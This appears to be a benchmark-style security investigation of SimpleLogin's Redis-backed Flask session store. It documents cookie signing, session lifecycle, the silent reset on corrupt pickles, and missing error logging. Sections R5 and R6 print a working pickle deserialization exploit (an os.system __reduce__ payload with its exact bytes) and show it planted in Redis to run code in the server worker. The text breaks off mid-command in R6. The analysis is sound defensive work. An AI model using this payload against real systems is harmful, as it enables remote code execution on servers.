# SimpleLogin Server-Side (Redis-Backed) Flask Session Subsystem — Runtime-Grounded Q&A

> **Scope of this document.** This is a runtime-grounded investigation of how SimpleLogin's custom, Redis-backed Flask session subsystem behaves at runtime, with a focused analysis of how stored session data is turned back into Python objects (deserialization) and exactly where the boundary lies between a harmless session reset and a genuine code-execution risk. Every behavioral claim below is backed by **actual output observed from running the real code paths** in the canonical Python 3.10 build — not by reading alone. Statements that could not be directly observed are explicitly labeled **inferred**. Anything obtained under a non-canonical interpreter is labeled **NON-CANONICAL**.

---

## Headline finding (one paragraph)

The session subsystem is a custom `RedisSessionStore(SessionInterface)` (`app/session.py:31`) that **`pickle`-serializes** the session dictionary into Redis under the key `session:<uuid>` and signs **only the session-ID pointer** in the `slapp` cookie with `itsdangerous.Signer`. On each request, `RedisSessionStore.open_session` reads the raw bytes from Redis and calls **`pickle.loads(val)`** (`app/session.py:76`) to reconstruct the Python `dict`. That single call is wrapped in a bare **`try / except Exception: pass`** (`app/session.py:78-79`) with **no logging call inside it**, falling through to a brand-new empty session (`app/session.py:80`). Observed consequences: **(1)** corrupt/malformed bytes (random garbage or a truncated pickle) → `UnpicklingError` is raised, caught, and **silently swallowed** → the request gets a fresh session and proceeds normally (HTTP 302/200, **never a 500**), with **no error line in the logs and no Sentry event**; **(2)** a **well-formed malicious pickle** does **not** raise — its `__reduce__` callable **executes during `pickle.loads` itself** (`app/session.py:76`), *before* the `except` can help — so the true boundary is **"reset vs. code execution," not "reset vs. error"**; and **(3)** because the signer authenticates only the session-ID string (`_get_signer` at `app/session.py:37-41`) and applies **no MAC to the pickled payload**, an attacker who can tamper with the stored bytes but **cannot** forge the cookie still reaches the vulnerable `pickle.loads` by reusing a legitimately-signed cookie — changing the risk from a benign reset to potential remote code execution. Forging/altering the cookie signature, by contrast, makes `extract_and_validate_session_id` return `None` (`app/session.py:58-59`) and the tampered Redis value is **never read at all**.

---

## Methodology & canonical build

All reported values below were produced in the **canonical Python 3.10 build** delivered by the project's Docker container. The host agent sandbox (Python 3.13) is **NOT** canonical and was not used to produce any of the runtime evidence in the answer sections.

| Item | Value |
|------|-------|
| Canonical image | `ghcr.io/scaleapi/swe-atlas:swe_atlas_QnA_simple-login_app_1.0` (container name `sl-app`) |
| Interpreter | **Python 3.10.18** (canonical) |
| App entry point | `wsgi:app` (`wsgi.py` exposes `app = create_app()`) |
| Web server | `gunicorn 20.0.4`, `--bind 127.0.0.1:7777 --workers 1 --timeout 120` |
| Session backend | Redis 7 at `redis://localhost` (`MEM_STORE_URI`) |
| Database | PostgreSQL 15 at `postgresql://test:test@localhost:5432/test` (`DB_URI`) |
| Secret | `FLASK_SECRET=secret` (a **local test value**, not a real credential — from the project's `tests/test.env` template) |
| Seed user | `john@wick.com` / `password` (activated admin; `flask dummy-data`) |
| Sentry | `SENTRY_DSN` **unset** in the canonical local build → Sentry never initialized |

**Interpreter confirmation (canonical):**

```console
$ docker exec sl-app bash -lc 'python --version'
Python 3.10.18
```

**Required precondition — the session interface is Redis-backed** (checked *before* observing anything):

```console
$ docker exec sl-app bash -lc 'set -a && source /app/slenv.sh && set +a && source /app/venv/bin/activate && cd /app && python -c "from wsgi import app; print(type(app.session_interface).__module__ + \".\" + type(app.session_interface).__name__)"'
app.session.RedisSessionStore
```

This confirms `app.session_interface` is `app.session.RedisSessionStore`, wired for the `redis://` URI in `app/redis_services.py:12` (same connection used for both reads and writes in plain-Redis mode).

**Runtime environment (from `/app/slenv.sh`):** `FLASK_SECRET=secret`, `MEM_STORE_URI=redis://localhost`, `DB_URI=postgresql://test:test@localhost:5432/test`, `URL=http://localhost` (so `SESSION_COOKIE_SECURE` is **not** set — plain HTTP, matching `server.py:160-161`), `FLASK_APP=server.py`, `DISABLE_RATE_LIMIT=1`, `EVENT_WEBHOOK_DISABLE=1`.

**Seed-user verification (the seed already existed from a prior run):**

```console
$ docker exec sl-app bash -lc '... flask dummy-data'
psycopg2.errors.UniqueViolation: duplicate key value violates unique constraint "uq_users_email"
DETAIL:  Key (email)=(john@wick.com) already exists.

$ docker exec sl-app bash -lc 'psql "$DB_URI" -tAc "SELECT id,email,activated,is_admin FROM users WHERE email='"'"'john@wick.com'"'"'"'
395|john@wick.com|t|t
```

**Server invocation (canonical, detached, stdout+stderr captured for the R4 log-surface inspection):**

```console
$ docker exec -d sl-app bash -lc 'set -a && source /app/slenv.sh && set +a && source /app/venv/bin/activate && cd /app && exec gunicorn --bind 127.0.0.1:7777 --workers 1 --timeout 120 wsgi:app > /tmp/sl_server.log 2>&1'
# boot log (/tmp/sl_server.log):
[INFO] Starting gunicorn 20.0.4
[INFO] Listening at: http://127.0.0.1:7777 (16027)
[INFO] Using worker: sync
[INFO] Booting worker with pid: 16035
```

The gunicorn **master pid is 16027** and the single **worker pid is 16035** — this worker pid is the key evidence for R5/R6 (a marker file stamped with `ppid=16035` proves the *server worker* executed attacker code).

**Endpoint reachability:**

```console
$ curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:7777/health   # 200
$ curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:7777/          # 302 -> /auth/login
$ curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:7777/auth/login # 200
```

**How the real login/logout path was driven.** CSRF is enabled outside the test suite, so a cookie-jar HTTP client (`requests.Session`) was used **inside the container**: `GET /auth/login` first (creating the CSRF-only session and returning the initial `slapp` cookie), scrape the `csrf_token` hidden field, then `POST /auth/login` with `email`, `password`, `csrf_token`; logout via `GET /auth/logout`. This exercises the **real** entry point `login()` → `after_login()` → `login_user()` (`app/auth/views/login.py`, `app/auth/views/login_utils.py:36-37`) and `logout_session()` (`app/auth/views/logout.py:10`). `login_user()` was **never** called directly (that would be a bypass). Redis was inspected with `redis-cli` and a Python `redis` client; the payload was decoded with a canonical `pickle.loads`.

**Repository integrity.** This investigation is strictly read-only on all existing source. The only artifact added is this document. The final `git status --porcelain` proof is in the [Appendix](#appendix-repository-integrity-proof).

---

## The five user questions (reproduced verbatim)

1. *How does server-side session handling behave at runtime, especially when stored session data is turned back into Python objects (deserialization)?*
2. *What do normal sessions look like as users log in and out?*
3. *What actually happens if the session data in Redis is corrupted or malformed — does the next request fail, silently reset the session, or surface an error, and what shows up in responses or logs?*
4. *Where is the boundary between a harmless reset and a real deserialization risk (based on observed runtime behavior, not theory)?*
5. *If an attacker could tamper with session bytes but not forge the signed session ID, does that meaningfully change the risk, and how does runtime behavior support that conclusion?*

These map to the six named requirements answered below: **R1** (deserialization mechanism), **R2** (normal lifecycle), **R3** (malformed-data behavior), **R4** (response/log surface), **R5** (risk boundary), **R6** (attacker tampering without forging the ID).

---

## R1 — Deserialization mechanism

**Direct answer.** Stored session bytes are turned back into Python objects by a single call to **`data = pickle.loads(val)`** inside the method **`RedisSessionStore.open_session`** at **`app/session.py:76`**. `open_session` first resolves the session ID from the signed `slapp` cookie, reads the raw bytes at the Redis key `session:<uuid>` via `val = self._redis_r.get(self._get_key(session_id))` (`app/session.py:73`), and — if the value is present — unpickles it and wraps the resulting `dict` in a `ServerSession` (`app/session.py:77`). The serializer is the **standard-library `pickle`** module (the code prefers `cPickle` but that name does not exist on Python 3, so the `except ImportError` fallback selects stdlib `pickle` — `app/session.py:9-12`).

**Grounding (`file:line`).**

- Serializer import with fallback — `app/session.py:9-12`:
  ```python
  try:
      import cPickle as pickle
  except ImportError:
      import pickle
  ```
- Key prefix `SESSION_PREFIX = "session"` — `app/session.py:18`; key builder `_get_key` → `f"{SESSION_PREFIX}:{session_Id}"` (i.e. `session:<uuid>`) — `app/session.py:44-45`.
- `RedisSessionStore.open_session` — `app/session.py:68-80`; the Redis read is `app/session.py:73`; **the deserialization call `data = pickle.loads(val)` is `app/session.py:76`**; the wrap `return ServerSession(data, session_id)` is `app/session.py:77`; `ServerSession(CallbackDict, SessionMixin)` is defined at `app/session.py:21-28`.

**Evidence — the serializer actually used at runtime (canonical 3.10):**

```console
$ docker exec sl-app bash -lc 'set -a && source /app/slenv.sh && set +a && source /app/venv/bin/activate && cd /app && python -c "
import app.session as s
print(\"pickle module name:\", s.pickle.__name__)
print(\"pickle module file:\", s.pickle.__file__)
try:
    import cPickle; print(\"cPickle importable:\", True)
except ImportError as e:
    print(\"cPickle importable:\", False, \"->\", e)
import pickle
print(\"DEFAULT_PROTOCOL:\", pickle.DEFAULT_PROTOCOL, \"HIGHEST_PROTOCOL:\", pickle.HIGHEST_PROTOCOL)
print(\"loads impl module:\", pickle.loads.__module__)
"'
pickle module name: pickle
pickle module file: /usr/local/lib/python3.10/pickle.py
cPickle importable: False -> No module named 'cPickle'
DEFAULT_PROTOCOL: 4 HIGHEST_PROTOCOL: 5
loads impl module: _pickle
```

**Causal reasoning.** Redis stores opaque bytes; the application chose `pickle` to round-trip an arbitrary Python `dict`. On the way in, `save_session` calls `pickle.dumps(dict(session))` (`app/session.py:91`); on the way out, `open_session` calls `pickle.loads(val)` (`app/session.py:76`). Because `cPickle` is unavailable on Python 3, the runtime uses stdlib `pickle` (C-accelerated `_pickle` under the hood). `DEFAULT_PROTOCOL = 4` is why every payload observed below begins with the bytes `\x80\x04` (the pickle protocol-4 frame opcode). This `pickle.loads` call is the single most security-relevant line in the subsystem and is the focus of R3–R6.

---

## R2 — Normal session lifecycle

**Direct answer.** A session is a **signed session-ID cookie named `slapp`** (`SESSION_COOKIE_NAME = "slapp"`, `app/config.py:199`) plus a **pickled `dict` stored in Redis** at `session:<uuid>`. The cookie value has the shape `<uuid>.<itsdangerous-signature>`; only the UUID pointer is signed. A logged-in session's decoded dict contains `_user_id`, `_fresh`, `_id` (populated by Flask-Login's `login_user()`), `sudo_time` (set at `app/auth/views/login_utils.py:37`), the Flask-WTF `csrf_token`, and `_permanent`. Authenticated sessions get a **7-day** TTL (`server.py:204-207`); an unauthenticated request produces a **CSRF-only** session with a **300-second** TTL (`app/session.py:95-96`). **Logout** deletes the Redis key and **rotates the session ID to a new UUID** (`purge_session`, `app/session.py:61-66`, invoked by `logout_session()`, `app/session.py:117-121`) and the response deletes the `slapp` cookie (`app/auth/views/logout.py:13`).

### R2(a) — Unauthenticated / CSRF-only session (condition 3)

**Observed — `GET /auth/login` before any login:**

```console
# Set-Cookie on the GET /auth/login response:
Set-Cookie: slapp=e9cda0f3-48f8-4b0a-b2df-2bb3aa06242b.rnZa1Rz5d8og9AbOT87U-ssiSN8; Expires=Wed, 15-Jul-2026 05:36:22 GMT; HttpOnly; Path=/; SameSite=Lax

# Redis state for this session id:
$ redis-cli EXISTS session:e9cda0f3-48f8-4b0a-b2df-2bb3aa06242b
(integer) 1
$ redis-cli TTL session:e9cda0f3-48f8-4b0a-b2df-2bb3aa06242b
(integer) 300

# Raw pickled bytes stored in Redis:
b'\x80\x04\x95U\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\n_permanent\x94\x88\x8c\x06_fresh\x94\x89\x8c\ncsrf_token\x94\x8c(f179b8515a69a46ca10cd7725d491444c2518a9d\x94u.'

# Decoded via canonical pickle.loads:
keys = ['_fresh', '_permanent', 'csrf_token']
_permanent = True
_fresh = False
csrf_token = 'f179b8515a69a46ca10cd7725d491444c2518a9d'
```

- The cookie carries **no `Secure` flag** because `URL=http://localhost` (not HTTPS) — matches `server.py:160-161`. `SameSite=Lax` and `HttpOnly` match `server.py:162` and `app/session.py:105-114`.
- **TTL = 300** confirms the CSRF-only branch: `save_session` sets `ttl = 300` when `"_user_id" not in session` (`app/session.py:95-96`).
- **Observed key set** (report exactly what appears): `['_fresh', '_permanent', 'csrf_token']` — i.e. the CSRF token **plus** Flask/Flask-Login bookkeeping (`_permanent`, `_fresh`), and notably **no `_user_id`** yet.

### R2(b) — Authenticated login (condition 1)

**Observed — `POST /auth/login` (email=`john@wick.com`, password=`password`, scraped `csrf_token`):**

```console
# Response:
HTTP/1.0 302 FOUND
Location: http://127.0.0.1:7777/dashboard/

# The session id in the cookie is UNCHANGED from the pre-login GET:
slapp uuid still = e9cda0f3-48f8-4b0a-b2df-2bb3aa06242b
session_id changed on login? False

# Redis TTL is now 7 days:
$ redis-cli TTL session:e9cda0f3-48f8-4b0a-b2df-2bb3aa06242b
(integer) 604800

# Raw pickled bytes now stored:
b'\x80\x04\x95!\x01\x00\x00\x00\x00\x00\x00}\x94(\x8c\n_permanent\x94\x88\x8c\x06_fresh\x94\x88\x8c\ncsrf_token\x94\x8c(f179b8515a69a46ca10cd7725d491444c2518a9d\x94\x8c\x08_user_id\x94\x8c$e76413ad-9d99-42ae-991a-199a64e10e7a\x94\x8c\x03_id\x94\x8c\x80f4a4143536f3e6712e19e6ce901a12f1ff7e8c98d04dd3e41c746e85093b48a1bfaa93650d1759a0cb7f13cba57b7f96e40ed981f0c49af1cb94f9905ee1dd03\x94\x8c\tsudo_time\x94J\xd6\xe1Mju.'

# Decoded via canonical pickle.loads:
keys = ['_fresh', '_id', '_permanent', '_user_id', 'csrf_token', 'sudo_time']
_permanent = True
_fresh     = True
csrf_token = 'f179b8515a69a46ca10cd7725d491444c2518a9d'
_user_id   = 'e76413ad-9d99-42ae-991a-199a64e10e7a'
_id        = 'f4a4143536f3e6712e19e6ce901a12f1ff7e8c98d04dd3e41c746e85093b48a1bfaa93650d1759a0cb7f13cba57b7f96e40ed981f0c49af1cb94f9905ee1dd03'
sudo_time  = 1783488982

# Authenticated page confirms login:
$ GET /dashboard -> 200
```

**Key-origin cross-reference:**

| Key | Value observed | Set by | `file:line` |
|-----|----------------|--------|-------------|
| `_user_id` | `e76413ad-…-199a64e10e7a` | Flask-Login `login_user()` | `app/auth/views/login_utils.py:36` |
| `_fresh` | `True` | Flask-Login `login_user()` | (flask-login 0.5.0 internals) |
| `_id` | 128-hex identity hash | Flask-Login `login_user()` (tied to `session_protection = "strong"`) | `app/extensions.py:8` |
| `sudo_time` | `1783488982` | app view | `app/auth/views/login_utils.py:37` |
| `csrf_token` | `f179b851…2518a9d` | Flask-WTF | (extension) |
| `_permanent` | `True` | `session.permanent = True` | `server.py:206` |

- **`before`** (pre-login): `['_fresh', '_permanent', 'csrf_token']`, TTL 300. **`after`** (post-login): six keys above, TTL 604800.
- Observed nuance worth stating: **the session ID is NOT rotated on login** — the same UUID `e9cda0f3-…` carries through; only the *contents* and TTL change. (Rotation happens on logout — see R2(d).)

### R2(c) — `save_session` write path (grounding)

Every response writes the session back:

```python
# app/session.py
val = pickle.dumps(dict(session))                       # L91
ttl = int(app.permanent_session_lifetime.total_seconds())  # L92 -> 604800 (7 days)
if "_user_id" not in session:
    ttl = 300                                           # L95-96  (CSRF-only)
self._redis_w.setex(name=self._get_key(session.session_id),
                    value=val, time=ttl)                # L97-101
signed_session_id = self._get_signer(app).sign(
    itsdangerous.want_bytes(session.session_id))        # L102-104  (signs only the id)
response.set_cookie(app.session_cookie_name, signed_session_id, ...)  # L105-114
```

### R2(d) — Logout (condition 2)

**Observed — `GET /auth/logout`:**

```console
# BEFORE: authenticated session_id = e9cda0f3-48f8-4b0a-b2df-2bb3aa06242b (redis EXISTS=1)

# Response:
HTTP/1.0 302 FOUND
Location: http://127.0.0.1:7777/auth/login

# ALL FOUR Set-Cookie headers on the logout response (exact, unedited):
Set-Cookie: slapp=; Expires=Thu, 01-Jan-1970 00:00:00 GMT; Max-Age=0; Path=/
Set-Cookie: mfa=; Expires=Thu, 01-Jan-1970 00:00:00 GMT; Max-Age=0; Path=/
Set-Cookie: dark-mode=; Expires=Thu, 01-Jan-1970 00:00:00 GMT; Max-Age=0; Path=/
Set-Cookie: slapp=e0f86ac7-488d-48a2-ab87-27a3258231ba.6hxsrWJsmhEM0ez1PUhnQrBSiNM; Expires=Wed, 15-Jul-2026 05:36:23 GMT; HttpOnly; Path=/; SameSite=Lax

# AFTER:
$ redis-cli EXISTS session:e9cda0f3-48f8-4b0a-b2df-2bb3aa06242b   # old key
(integer) 0
session_id rotated? True   (new id = e0f86ac7-488d-48a2-ab87-27a3258231ba)
$ redis-cli EXISTS session:e0f86ac7-488d-48a2-ab87-27a3258231ba   # new key
(integer) 1
$ redis-cli TTL session:e0f86ac7-488d-48a2-ab87-27a3258231ba
(integer) 238
# decoded new-session contents: {_permanent: True, csrf_token, sudo_time (leftover),
#   _flashes: [('success', 'You are logged out')]}  -- _user_id/_fresh/_id removed by logout_user()
```

**Grounding & reasoning.**

- `logout_session()` (`app/auth/views/logout.py:10`) calls Flask-Login `logout_user()` and then `purge_session(session)` (`app/session.py:117-121`).
- `purge_session` (`app/session.py:61-66`) does two things: **`self._redis_w.delete(...)`** (`app/session.py:63`) removes the old `session:<uuid>` key → observed `EXISTS 0`; and **`session.session_id = str(uuid.uuid4())`** (`app/session.py:64`) rotates the ID → observed new UUID `e0f86ac7-…`.
- The **first** `slapp` header (empty, `Max-Age=0`) is `response.delete_cookie(SESSION_COOKIE_NAME)` at `app/auth/views/logout.py:13`; the view also deletes `mfa` (`:14`) and `dark-mode` (`:15`). The **fourth** `slapp` header (new rotated UUID) is emitted by `save_session` running *after* the view returns — hence **two `slapp` `Set-Cookie` headers** on one response. The new key's TTL is 300-based (238 remaining) because `logout_user()` removed `_user_id`, so the CSRF-only branch (`app/session.py:95-96`) applies again.
- The **API logout sibling** `app/api/views/user_info.py:140,142` (`logout_session()` then `response.delete_cookie(SESSION_COOKIE_NAME)`) is the **inferred**-equivalent path; it was not exercised at runtime but calls the identical `logout_session()`/`delete_cookie` pair.

---

## R3 — Malformed-data behavior

**Direct answer: silent reset.** When the Redis session value is corrupt or malformed, the next request does **not** fail and does **not** surface an error — it **silently resets** the session. `open_session` wraps the `pickle.loads` call in a bare `try / except Exception: pass` (`app/session.py:78-79`) and, on any exception, falls through to `return ServerSession(session_id=str(uuid.uuid4()))` (`app/session.py:80`) — a brand-new empty session with a fresh UUID. Proven below for **both** random garbage bytes and a truncated valid pickle.

**Grounding (`file:line`).** `app/session.py:74-80`:

```python
if val is not None:
    try:
        data = pickle.loads(val)                 # L76  <-- deserialization
        return ServerSession(data, session_id)   # L77
    except Exception:                            # L78  <-- catches EVERYTHING
        pass                                     # L79  <-- no logging, no re-raise
return ServerSession(session_id=str(uuid.uuid4()))  # L80  <-- silent reset
```

### R3 Case 1 — Random / garbage bytes (condition 5)

```console
# BEFORE: fresh authenticated login
session_id = 9a35e687-ba5f-4cad-b813-d136751434fd
cookie     = 9a35e687-ba5f-4cad-b813-d136751434fd.D5lu6wNBDB6WrXwc_tNJENj3PP8
$ redis-cli EXISTS session:9a35e687-ba5f-4cad-b813-d136751434fd   -> (integer) 1
$ redis-cli TTL    session:9a35e687-ba5f-4cad-b813-d136751434fd   -> (integer) 604800
decoded keys = ['_fresh', '_id', '_permanent', '_user_id', 'csrf_token', 'sudo_time']
$ GET /dashboard -> 200   (authenticated)

# POISON: overwrite ONLY the Redis payload (valid signed cookie retained)
>>> r.set("session:9a35e687-ba5f-4cad-b813-d136751434fd", b"\x00\x01\x02not-a-pickle\xff\xfe")   # 17 bytes

# DURING: reproduce the deserialization against the EXACT poisoned bytes (canonical 3.10)
$ python -c "import pickle; pickle.loads(b'\x00\x01\x02not-a-pickle\xff\xfe')"
Traceback (most recent call last):
  File "<string>", line 1, in <module>
_pickle.UnpicklingError: invalid load key, '\x00'.

# AFTER: next request with the SAME valid cookie
$ GET /dashboard
HTTP/1.0 302 FOUND
Location: http://127.0.0.1:7777/auth/login?next=%2Fdashboard%3F
$ GET /auth/login -> 200          # plain non-error page
session_id reset to NEW uuid = 444f6a27-2487-44aa-9786-ce9da66c89f9   (rotated? True)
$ redis-cli EXISTS session:9a35e687-ba5f-4cad-b813-d136751434fd  -> (integer) 1   # garbage still there
$ redis-cli EXISTS session:444f6a27-2487-44aa-9786-ce9da66c89f9  -> (integer) 1   # new session
```

- **`before`**: populated authenticated session, `/dashboard` = 200.
- **`during`**: `pickle.loads` on the exact poisoned bytes raises **`_pickle.UnpicklingError: invalid load key, '\x00'.`**
- **`after`**: the request is redirected to login (Flask-Login sees no `_user_id` in the fresh session) with a **302**, not a 500; the session ID is reset to a new UUID.
- Observed nuance: `open_session` **does not delete** the corrupt key — it just returns a fresh session (`app/session.py:80`), so the garbage key persists in Redis until its TTL expires.

### R3 Case 2 — Truncated valid pickle (condition 6)

```console
# PICKLE MATERIAL
FULL valid pickle (131 bytes):
b'\x80\x04\x95x\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\n_permanent\x94\x88\x8c\x06_fresh\x94\x88\x8c\ncsrf_token\x94\x8c\x08deadbeef\x94\x8c\x08_user_id\x94\x8c$e76413ad-9d99-42ae-991a-199a64e10e7a\x94\x8c\tsudo_time\x94J\xd6\xe1Mju.'
TRUNCATED first half (65 bytes):
b'\x80\x04\x95x\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\n_permanent\x94\x88\x8c\x06_fresh\x94\x88\x8c\ncsrf_token\x94\x8c\x08deadbeef\x94\x8c\x08_'

# BEFORE: fresh authenticated login
session_id = b8712a09-bcba-42db-b779-f039537844ad
$ redis-cli EXISTS session:b8712a09-bcba-42db-b779-f039537844ad -> (integer) 1
$ redis-cli TTL    session:b8712a09-bcba-42db-b779-f039537844ad -> (integer) 604800
$ GET /dashboard -> 200

# POISON: r.set("session:b8712a09-...", <65-byte truncated pickle>)

# DURING: reproduce against the exact truncated bytes (canonical 3.10)
$ python -c "import pickle; pickle.loads(b'\x80\x04\x95x\x00\x00\x00\x00\x00\x00\x00}\x94(\x8c\n_permanent\x94\x88\x8c\x06_fresh\x94\x88\x8c\ncsrf_token\x94\x8c\x08deadbeef\x94\x8c\x08_')"
Traceback (most recent call last):
  File "<string>", line 1, in <module>
_pickle.UnpicklingError: pickle data was truncated

# AFTER:
$ GET /dashboard
HTTP/1.0 302 FOUND
Location: http://127.0.0.1:7777/auth/login?next=%2Fdashboard%3F
$ GET /auth/login -> 200
session_id reset to NEW uuid = 4996bd9b-bc1d-4d23-9dda-24b1ff20982c   (rotated? True)
old key EXISTS=1 (truncated ignored); new key EXISTS=1
```

- **`during`**: `pickle.loads` on the truncated bytes raises **`_pickle.UnpicklingError: pickle data was truncated`**.
- Same **`before` → `during` → `after`** shape as Case 1: populated → raises → silent reset to a new UUID; **302, never 500**.

**Causal reasoning (R3).** `UnpicklingError` is a subclass of `Exception`, so the bare `except Exception` at `app/session.py:78` catches it; `pass` (`:79`) discards it; control falls to `app/session.py:80`, returning an empty `ServerSession`. Flask-Login then finds no `_user_id`, so the `login_required` view redirects to `/auth/login` — a normal 302, indistinguishable from an ordinary "not logged in" response.

---

## R4 — Response/log surface

**Direct answer.** When malformed data is encountered: the **HTTP response is a normal (non-error) response** (a `302` redirect to login, followed by `200` on the login page) — **never a 500**; the **application log shows no deserialization error line** (only ordinary request-completion `DEBUG` lines); and **no Sentry event** is produced. This follows directly from the bare `except Exception: pass` (`app/session.py:78-79`) containing **no logging call**, and from Sentry capturing only *uncaught* exceptions.

### R4(a) — HTTP responses

Both malformed cases above returned a **302** to `/auth/login?next=…` and a subsequent **200** on the login page. No `500`, no traceback page, no stack trace in the body. The client sees exactly what a logged-out visitor sees.

### R4(b) — Application logs (the "SL" logger → stdout)

The captured stdout window (`/tmp/sl_server.log`) around each poisoned request contained **only** the benign request-completion `DEBUG` lines emitted by `after_request()` at `server.py:284`:

```text
2026-07-08 05:40:06,761 - SL - DEBUG - 16035 - "/app/server.py:284" - after_request() -  - 127.0.0.1 GET /dashboard ImmutableMultiDict([]) 302, takes 0.000334...
2026-07-08 05:40:07,366 - SL - DEBUG - 16035 - "/app/server.py:284" - after_request() -  - 127.0.0.1 GET /auth/login ImmutableMultiDict([]) 200, takes 0.001428...
```

Automated content checks on that exact log window:

```text
window contains 'UnpicklingError' ? False
window contains 'Traceback'       ? False
window contains 'pickle'          ? False
window contains ' ERROR '         ? False
```

- The request itself **is** logged (the normal `302`/`200` completion line), but the **swallowed pickle error is not** — because there is **no logging call inside the `except` block** (`app/session.py:78-79`).
- Grounding for the log configuration: the "SL" logger writes to `sys.stdout` (`app/log.py:41`) at level `DEBUG` (`app/log.py:51`); `LOG = _get_logger("SL")` (`app/log.py:79`); werkzeug's default request logging is disabled (`app/log.py:70-71`), which is why there is no separate werkzeug access line.

### R4(c) — Sentry

```console
$ docker exec sl-app bash -lc '... python -c "import app.config as c; print(\"SENTRY_DSN =\", repr(getattr(c, \"SENTRY_DSN\", None)))"'
SENTRY_DSN = None
```

- **Observed:** `SENTRY_DSN` is `None` in the canonical local build, so the `if SENTRY_DSN:` guard at `server.py:111` is false and `sentry_sdk.init(...)` never runs → **no Sentry event is possible**.
- **Inferred:** even if Sentry *were* initialized, its Flask integration captures **uncaught** exceptions; a `pickle.loads` failure here is *caught* by `app/session.py:78-79`, so it would not be reported. (The "not initialized" fact is observed; the "would not report even if initialized" clause is labeled **inferred**.)

**Causal reasoning (R4).** The silent-reset design means the failure never propagates: no exception escapes `open_session`, so Flask's error handling (and any 500 page) is never triggered; no logging statement exists on the failure path, so nothing is written to the "SL" stream beyond the normal request line; and Sentry — unset here and dependent on *uncaught* exceptions — has nothing to capture.

---

## R5 — Risk boundary (observed, not theory)

**Direct answer.** The boundary is **"reset vs. code execution," not "reset vs. error."** Random / truncated / corrupt bytes raise inside `pickle.loads`, get caught at `app/session.py:78-79`, and reset the session (R3). But a **well-formed malicious pickle does not raise** — its `__reduce__` callable **executes *during* `pickle.loads` at `app/session.py:76`, *before* the `except` can act** — so the exact same code path that harmlessly resets on garbage will *run attacker-chosen code* on a valid-but-malicious payload. Proven by a marker file written by the gunicorn worker process itself.

### R5 — CWE-502 proof-of-construct (labeled: standard PoC, NOT user-supplied)

The payload is a standard CWE-502 construct — a class whose `__reduce__` returns `(os.system, (cmd,))` where `cmd` writes an unmistakable marker stamped with the running process's PID:

```python
# cmd = 'echo "code-exec-during-pickle.loads ppid=$PPID epoch=$(date +%s)" > /tmp/pwned_marker'
class Exploit:
    def __reduce__(self):
        import os
        return (os.system, (cmd,))
malicious = pickle.dumps(Exploit())
```

**Exact malicious bytes (123 bytes):**

```text
b'\x80\x04\x95p\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8cUecho "code-exec-during-pickle.loads ppid=$PPID epoch=$(date +%s)" > /tmp/pwned_marker\x94\x85\x94R\x94.'
```

The opcodes tell the story: `\x8c\x05posix` (push module `posix`), `\x8c\x06system` (attribute `system`), the command string, then `R` (the `REDUCE` opcode) — i.e. on load, pickle calls `posix.system(cmd)`. **Local reproduction (a throwaway canonical 3.10 process, pid 16159):**

```console
$ python -c "import pickle, os
class Exploit:
    def __reduce__(self): return (os.system, (cmd,))
...
rv = pickle.loads(malicious)
print('return value:', repr(rv))"
return value: 0                      # os.system exit code; NO exception raised
# marker written: 'code-exec-during-pickle.loads ppid=16159 epoch=1783489448'
```

`pickle.loads` returned the `os.system` exit code `0` and **raised no exception** — confirming the callable ran *inside* `loads`.

### R5 — Server-side code execution (condition 7)

```console
# BEFORE: fresh authenticated login
session_id = b886149a-c93c-40aa-9cbe-e4ce4962a366
cookie     = b886149a-c93c-40aa-9cbe-e4ce4962a366.7ksUa1FC0J7-M3LGU7rS5k48iQE
$ GET /dashboard -> 200            # authenticated
$ test -f /tmp/pwned_marker && echo EXISTS || echo ABSENT
ABSENT

# PLANT the malicious pickle at the session key (valid signed cookie retained):
>>> r.set("session:b886149a-c93c-40aa-9cbe-e4ce4962a366", <malicious 123 bytes>)

# DURING/AFTER: next request with the SAME valid cookie
$ GET /dashboard
HTTP/1.0 302 FOUND
Location: http://127.0.0.1:7777/auth/login?next=%2Fdashboard%3F

$ cat /tmp/pwned_marker
code-exec-during-pickle.loads ppid=16035 epoch=1783489448
```

**The `ppid=16035` is the gunicorn worker pid** (from the boot log). The marker was written by the **server process itself** while handling the request — proving `posix.system(...)` executed inside `RedisSessionStore.open_session`'s `pickle.loads` at `app/session.py:76`.

Log window during the malicious request (same benign surface as a harmless reset):

```text
2026-07-08 ... - SL - DEBUG - 16035 - "/app/server.py:284" - after_request() -  - 127.0.0.1 GET /dashboard ImmutableMultiDict([]) 302, takes ...
# contains 'UnpicklingError'? False   'Traceback'? False   'ERROR'? False
```

**R5 conclusion (from observed behavior).** A well-formed malicious pickle **does not raise**, so the `except` at `app/session.py:78` is *never reached* for it — the damage (`posix.system`) is already done by the time `pickle.loads` returns. The **critical, observed** point: on both the **HTTP surface (302)** and the **log surface (no error line)**, the malicious code-execution request is **indistinguishable from a harmless reset**. That is precisely why the real boundary is **reset vs. code execution**, not reset vs. error. `before`: marker absent, authenticated. `during`: `pickle.loads` invokes `posix.system`. `after`: marker present (`ppid=16035`), request 302'd like any logged-out visitor.

---

## R6 — Attacker tampering without forging the signed ID

**Direct answer: yes — it changes the risk materially, from a benign reset to potential code execution.** `itsdangerous.Signer` authenticates **only the session-ID pointer** (`_get_signer` at `app/session.py:37-41`; signing at `app/session.py:102-104`; validation via `unsign` at `app/session.py:54-59`) and applies **no MAC to the pickled payload**. So an attacker who can write to Redis but reuses a **legitimately-signed** cookie (no forgery at all) still reaches the vulnerable `pickle.loads` and achieves code execution. Contrast: an attacker who *forges/alters the cookie signature* trips `BadSignature`, `extract_and_validate_session_id` returns `None` (`app/session.py:58-59`), and the tampered Redis value is **never read**.

### R6 — Tamper-without-forgery (condition 8)

```console
# A real login yields a legitimately-signed cookie:
cookie = c0589253-ff93-4a2a-9430-c6917cd6b7e3.VFIBxJl1L5m3Fg86ABxD2xZVtXM

# The signer authenticates ONLY the uuid pointer (canonical 3.10):
$ python -c "import itsdangerous
s = itsdangerous.Signer('secret', salt='session', key_derivation='hmac')
print(s.unsign('c0589253-ff93-4a2a-9430-c6917cd6b7e3.VFIBxJl1L5m3Fg86ABxD2xZVtXM').decode())"
